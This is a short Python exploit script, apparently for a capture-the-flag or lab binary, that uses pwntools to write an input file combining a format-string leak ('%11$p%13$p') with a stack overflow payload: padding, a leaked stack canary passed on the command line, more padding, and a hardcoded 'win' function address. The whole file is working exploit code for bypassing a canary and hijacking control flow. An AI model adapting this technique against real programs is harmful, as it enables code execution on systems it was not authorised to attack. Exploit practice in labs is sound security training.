from pwn import process
import sys

orig = 0x555555555535

offs = 0
canary = int(sys.argv[1][2:], 16).to_bytes(8, 'little')
print("canary:", canary)
 
win = 0x5555555552bc
address = (win + offs).to_bytes(8, "little")

padding1 = ("A"*(4*14)).encode("ascii")
padding2 = ("A"*(4*2)).encode("ascii")

payload = padding1 + canary + padding2 + address

with open('h1.in', 'wb') as f:
    f.write('%11$p%13$p\n'.encode())
    f.write('2\n'.encode())
    f.write(payload)
